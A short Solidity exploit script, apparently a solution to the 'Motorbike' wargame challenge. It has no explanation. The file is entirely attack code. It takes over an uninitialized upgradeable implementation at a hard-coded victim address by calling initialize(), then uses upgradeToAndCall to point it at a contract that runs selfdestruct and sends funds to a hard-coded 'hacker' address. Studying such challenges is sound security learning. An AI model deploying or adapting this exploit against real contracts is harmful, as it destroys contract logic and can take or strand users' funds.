// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
// import "hardhat/console.sol";
interface IMotorbike{
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}
contract Hack {
   Boom public boom;
   IMotorbike public motor;
   address public victim=0x46996cdCe07F3b27B3cd815a06daB4841DF1e167;
constructor(){
    motor=IMotorbike(victim);
}

   function init()external{
    motor.initialize();
   }
   function goBoom()external{
     boom=new Boom();
     bytes memory bom=abi.encodeWithSelector(boom.boomer.selector);
     motor.upgradeToAndCall(address(boom),bom);
   }

  

}

contract Boom{
    address public hacker=0x92e5c70Dd41824a0617e07271A7E1e81A9BcE064;
    function boomer()external
    {
        selfdestruct(payable(hacker));
        }
}